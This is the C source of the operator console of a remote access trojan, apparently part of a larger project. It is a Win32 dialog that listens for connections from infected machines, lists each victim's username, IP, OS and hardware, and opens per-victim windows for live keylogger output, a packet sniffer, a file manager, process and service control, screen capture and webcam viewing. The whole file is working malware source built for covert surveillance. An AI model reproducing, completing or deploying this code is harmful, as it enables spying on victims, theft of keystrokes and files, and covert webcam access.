#include "Main.h"
#include "resource.h"
#include "Settings.h"
#include "PacketHead.h"
void SetWindowControls(HWND hwnd)
{
	RECT rc;
	
	GetClientRect(hwnd, &rc);
	MoveWindow(GetDlgItem(hwnd, IDC_TAB3), 0, 0, rc.right, rc.bottom - 25, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_SERVERLIST), 0,25, rc.right - 10, rc.bottom - 55, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_INFORMATIOND), 0,25, rc.right - 10, rc.bottom - 55, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_LOGS), 0,25, rc.right - 10, rc.bottom - 55, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_MAIN_STATUS), 0,rc.bottom - 20, rc.right, 20, TRUE);
	
	return;
}
HWND hStatus;
LRESULT CALLBACK MainWndProc(HWND Dlg,UINT Mes,WPARAM wParam,LPARAM lParam)
{
	
	LV_COLUMN	col;
		LV_ITEM		item;
	TCITEM tie;
	int Event = 0;
    int statwidths[] = {100, 160, 300 ,-1};
	char IDS [10] = "";
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   
    POINT  pt;   // location of mouse click 
	FBIPACKETA Recv;
	InfoStruct Info;
	DWORD thread;
	HICON hIcon;
	DWORD Select;
	char Buffer [1024] = "";
	int ndx;
	int x;
	CHARFORMAT cf;
	HWND hEdit;
	switch(Mes)
	{
	case WM_INITDIALOG:
		
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 16, 16, 0);
		SendMessage(Dlg, WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
		DeleteObject(hIcon);
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 64, 64, 0);
		SendMessage(Dlg, WM_SETICON,ICON_BIG,(LPARAM)hIcon);
		
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_SERVERLIST),LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=40;
		
		col.pszText="ID";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),0,&col);
		col.cx=100;
		col.pszText="UserName";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),1,&col);
		col.cx=100;
		col.pszText="User level";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),2,&col);
		col.cx=200;
		col.pszText="Server Version.";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),3,&col);
		/////////////////////////////////////////////////////////////////////
		//initiating Server list.
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_LOGS),LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=50;
		
		col.pszText="Client";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),0,&col);
		col.cx=100;
		col.pszText="Action";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),1,&col);
		col.cx=100;
		col.pszText="Result";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),2,&col);
		col.cx=100;
		col.pszText="Time";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),3,&col);
		/////////////////////////////////////////////////////////////////////////
		SetWindowControls(Dlg);
		hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL, WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0, Dlg, (HMENU)IDC_MAIN_STATUS, GetModuleHandle(NULL), NULL);		
		
		SendMessage(hStatus, SB_SETPARTS, 4, (LPARAM)statwidths);
		SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Not listening");
		sprintf(Buffer, "Port: %d", ServerPort);
		SendMessage(hStatus, SB_SETTEXT, 1, (LPARAM)Buffer);
		ZeroMemory(Buffer, sizeof(Buffer));
		//sprintf(Buffer, "Sent: %dBytes / Recv: %dBytes", SentKb, RecvKb);
		SendMessage(hStatus, SB_SETTEXT, 2, (LPARAM)Buffer);
		SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)"Connections: 0");
		
		ShowWindow(GetDlgItem(Dlg, IDC_LOGS), FALSE);
		ShowWindow(GetDlgItem(Dlg, IDC_INFORMATIOND), FALSE);
		
		tie.mask = TCIF_TEXT | TCIF_IMAGE;  
		tie.pszText = "Server List";
		
		TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 0, &tie);
		
		tie.mask = TCIF_TEXT | TCIF_IMAGE;  
		tie.pszText = "Information";
		
		TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 1, &tie);
		
		tie.mask = TCIF_TEXT | TCIF_IMAGE;  
		tie.pszText = "Logs";
		
		TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 2, &tie);
		SetWindowControls(Dlg);
		break;
		
			case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
				SetWindowControls(Dlg);
			break;
			case WMSZ_BOTTOMLEFT:
				SetWindowControls(Dlg);
			break;
			case WMSZ_BOTTOMRIGHT:
				SetWindowControls(Dlg);
			break;
			case WMSZ_LEFT:
				SetWindowControls(Dlg);
            break;
			case WMSZ_RIGHT:
				SetWindowControls(Dlg);
			break;
			case WMSZ_TOP:
				SetWindowControls(Dlg);
			break;
			case WMSZ_TOPLEFT:
				SetWindowControls(Dlg);
			break;
			case WMSZ_TOPRIGHT:
				SetWindowControls(Dlg);
			break;
			}
			break;
		case WM_NOTIFY:
		switch(wParam)
		{
		case IDC_TAB3:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(Dlg, IDC_TAB3)); 
                   switch(iPage)
					{
					 case 0:
					 ShowWindow(GetDlgItem(Dlg, IDC_SERVERLIST), TRUE);
					 ShowWindow(GetDlgItem(Dlg, IDC_INFORMATIOND), FALSE);
					 ShowWindow(GetDlgItem(Dlg, IDC_LOGS), FALSE);
					 break;

					 case 1:
					 ShowWindow(GetDlgItem(Dlg, IDC_SERVERLIST), FALSE);
					 ShowWindow(GetDlgItem(Dlg, IDC_INFORMATIOND), TRUE);
					 ShowWindow(GetDlgItem(Dlg, IDC_LOGS), FALSE);
					 break;

					 case 2:
					 ShowWindow(GetDlgItem(Dlg, IDC_SERVERLIST), FALSE);
					 ShowWindow(GetDlgItem(Dlg, IDC_INFORMATIOND), FALSE);
					 ShowWindow(GetDlgItem(Dlg, IDC_LOGS), TRUE);
					 break;
					}
				
				break;
            }		
			break;
			case IDC_SERVERLIST:
        if(((LPNMHDR)lParam)->code == NM_RCLICK) // Right Click
			{	 
            // Get the client coordinates for the mouse click.
			  pt.x = 0;
			  pt.y = 0;
			  GetCursorPos(&pt);
		
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
	if(Listen == 0)
	{
        
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU2));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL);
			break;
	}
	else
	{
	
			hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_COMMANDS));

			if (hmenu == NULL) 
			{
             break;
			}
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 

            //ClientToScreen(Dlg, (LPPOINT) &pt);   
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, Dlg, NULL); 
			break;
	}
		
		}
		if(((LPNMHDR)lParam)->code == NM_CLICK) // Left Click
			{
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=IDS;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			sprintf(Buffer, "Server Version: %s\r\nUserName: %s\r\nUser Level: %s \r\nIP & Computer Name: %s \r\nOS & Service Pack Version: %s \r\nCPU: %s \r\nRAM: %s \r\nScreen Resolution: %s", 
				Information[atoi(IDS)].Buf6,
				Information[atoi(IDS)].Buf5,
				Information[atoi(IDS)].Buf1,
				Information[atoi(IDS)].Buf3,
				Information[atoi(IDS)].Buf4,
				Information[atoi(IDS)].Buf2,
				Information[atoi(IDS)].Buf7,
				Information[atoi(IDS)].Buf
				);
			


			SetWindowText(GetDlgItem(Dlg, IDC_INFORMATIOND), Buffer);
			}
		break;

		}
		break;
		///////////////////////////////////////////////////////////////////////////////////////////////////////		
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CLOSE:
			x = 0;
			MessageBox(NULL, "Close Msg", "Close", MB_OK);
			while(x < 1025)
			{
				if(send(Server[x],"", sizeof(""), 0) == SOCKET_ERROR)
				{
					if(WSAGetLastError() == WSAECONNRESET)
						{
						sprintf(Buffer, "%d", x);

						while(ndx < ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
							{
							
							ZeroMemory(&Info, sizeof(InfoStruct));
							item.iItem=ndx;
							item.mask=LVIF_TEXT;
							item.iSubItem=0;
							item.pszText=IDS;
							item.cchTextMax=12;
							ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
								if(!strcmp(IDS, Buffer))
								{
								 ListView_DeleteItem(GetDlgItem(Dlg,IDC_SERVERLIST), ndx);
								 break;
								}

							ndx++;
							}
						}
				Connections--;
				strcpy(ConnectionsA, "");
				sprintf(ConnectionsA, "Connections: %d",Connections); 
				SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);
				}
				if(x ==  ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
				{
				break;	
				}
				x++;
			}
			break;
			/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_ACCEPT:
			while(Server[S] != NULL)
			{
				S++;
				if(S == 1025)
				{
					Connections++;
					strcpy(ConnectionsA, "");
					sprintf(ConnectionsA, "Connections: %d - Connection limit reached.",Connections); 
					SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);
					S= 0;
				}
			}
			// Head.PacketType = PACKET_ADD_ID;
			Server[S]=accept(wParam,(LPSOCKADDR)&ServAdr,&AdrLen);
			FBISend(Server[S],"",S, 0, 0,PACKET_ADD_ID);
			////////////////////////////////////////////////////////////////////////////////////////////
			Connections++;
			strcpy(ConnectionsA, "");
			sprintf(ConnectionsA, "Connections: %d",Connections); 
			SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);
			break;
			/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_READ:
			ZeroMemory(&Recv, sizeof(FBIPACKETA));
			Recv = FBIRecv(wParam);
			switch(Recv.PacketType)
			{
			case PACKET_USER_JOINED:
				memcpy(&Information[Recv.ID], &Recv, sizeof(FBIPACKETA));
				sprintf(Buffer, "%d", Recv.ID);
				SetServer(Dlg, Recv.Buf1, Recv.Buf6, Recv.Buf5, Recv.Buf3, Buffer);
//				SetLog("Client Connected", "Pass", GetTime(), Information[Recv.ID].Buf3);
				break;
			case PACKET_TASK_MANAGER:
				SetProcess(Recv.Buf, Recv.Buf1, Recv.Buf2, Recv.Buf3, Recv.Buf4, Recv.ID);
				break;
			case PACKET_TASK_MANAGER_TASKS:
				SetWindow(Recv.Buf,Recv.ID2,Recv.ID);
				break;
			case PACKET_SERVICE_MAN:
				SetServiceGui(Recv.Buf, Recv.Buf1, Recv.Buf2, Recv.Buf3, Recv.ID2, Recv.ID);
				break;
			case PACKET_PROGRAM_FILES:
				SetProgramGui(Recv.Buf, Recv.Buf1, Recv.ID);
				break;
			case PACKET_FILE_MANAGER_DRIVE:
				SetDriveWindow(Recv.Buf, Recv.ID2, Recv.ID);
				break;
			case PACKET_FILE_MANAGER_FILE:
				SetFileWindow(Recv.Buf, Recv.Buf1, Recv.ID3, Recv.ID);
				break;				
			case PACKET_KEYLOGGER:
				hEdit = GetDlgItem (KeyHwnd[Recv.ID], IDC_ONLINE);
				ndx = GetWindowTextLength (hEdit);
				SetFocus (hEdit);
				SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
								
				memset( &cf, 0, sizeof(CHARFORMAT ) );      //  Initialize structure
				
				cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
				cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
				cf.crTextColor = dwTextColor;
				cf.yHeight = 32;
				strcpy( cf.szFaceName, "MS Sans Serif" );
				//  Set character formatting and background color
				SendDlgItemMessage(KeyHwnd[Recv.ID], IDC_ONLINE, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Recv.Buf));
				break;
				
			case PACKET_KEYLOGGER_WINDOW:
				SetKeylogger(Recv.Buf, Recv.ID);
				break;
				
			case PACKET_SNIFFER:
				SetPacketWindow(Recv.Buf, Recv.ID);
				break;
			case PACKET_SNIFFER_UPDATE:
				SendMessage(GetDlgItem(PacketHwnd[Recv.ID], IDC_MAIN_STATUS), SB_SETTEXT, 0, (LPARAM)Recv.Buf);
				break;
			case PACKET_SNIFFER_PORTS:
				SetPortWindow(Recv.Buf,Recv.Buf1,Recv.Buf2,Recv.Buf3,Recv.Buf4,Recv.ID);
				break;
			case PACKET_FILE_MANAGER_SEARCH:
				SetFileSearch(Recv.Buf, Recv.ID);
				break;
			}
			break;
		}
		break;
	case WM_COMMAND:
		switch(wParam)
		{
////////////////////////////////////////////////////////////////////////////////                      
        case IDC_LISTEN:
			if(Listen == 0)
			{
			 Listen = 1;
			 InitWSA();	
             CreateThread(NULL, 0,FileConnectWindow,(LPVOID)"", 0, &thread);		 
	    	 if(InitSocket(Dlg))		
			 {
	         SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Listening");
			 }
			 else
			 {
			 SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Error Listening please restart client!");
			 MessageBox(NULL, "Error Listening please restart client!", "Error Listening", MB_OK);
			 }
			}
		  
			else
			{
			MessageBox(NULL, "Already listening!", "Listening", MB_OK | MB_ICONERROR);
			}
		  break;
		case IDC_PACKETSNIFF:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
			if(PacketHwnd[atoi(Info.ID)] == NULL)
			{			
				CreateThread(NULL, 0,PacketWindow,(LPVOID)atoi(Info.ID), 0, &thread);
			}
			else
			{		
				break;
			}
			break;
		case IDC_KEYLOGGER:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
			if(KeyHwnd[atoi(Info.ID)] == NULL)
			{			
				CreateThread(NULL, 0,KeylogWindow,(LPVOID)atoi(Info.ID), 0, &thread);
			}
			else
			{		
				break;
			}

			break;
		case IDC_SYSTEM_MANAGER:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
          if(System[atoi(Info.ID)] == NULL)
		  {			
			CreateThread(NULL, 0,SystemWindow,(LPVOID)atoi(Info.ID), 0, &thread);
		  }
		  else
		  {		
			break;
		  }
			break;
		case IDC_FILEMANAGER:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);  
			
			if(File[atoi(Info.ID)] == NULL)
			{		
				CreateThread(NULL, 0,FileWindow,(LPVOID)atoi(Info.ID), 0, &thread);
			}
			else
			{		
				break;
			}
			break;
		case IDC_SCREENCAPTURE:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			if(Screen[atoi(Info.ID)] == NULL)
			{		
				CreateThread(NULL, 0,ScreenWindow,(LPVOID)atoi(Info.ID), 0, &thread);
			}
			else
			{		
				break;
			}
			break;
		case IDC_WEBCAM:
			ZeroMemory(&Info, sizeof(InfoStruct));
			item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Info.ID;
			item.cchTextMax=12;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			if(Web[atoi(Info.ID)] == NULL)
			{		
				CreateThread(NULL, 0,WebcamWindow,(LPVOID)atoi(Info.ID), 0, &thread);
			}
			else
			{		
				break;
			}			
			break;
		case IDCANCEL:
			ExitProcess(0);
			break;
		}
		return 0;
	}
	return 0;
}

HANDLE hRichEdit;
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HWND FBI;
	hRichEdit = LoadLibrary( "RICHED32.DLL" );
	if( ! hRichEdit )
	{                                      //  If Rich Edit DLL load fails, exit
		return( FALSE );
	}
	else
	{
	}
	FBI=CreateDialog(hInstance,(LPCTSTR)IDD_MAIN,NULL,(DLGPROC)MainWndProc);
 	ShowWindow(FBI,SW_SHOW);
	MSG msg;
	InitCommonControls();
	while(GetMessage(&msg,FBI,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}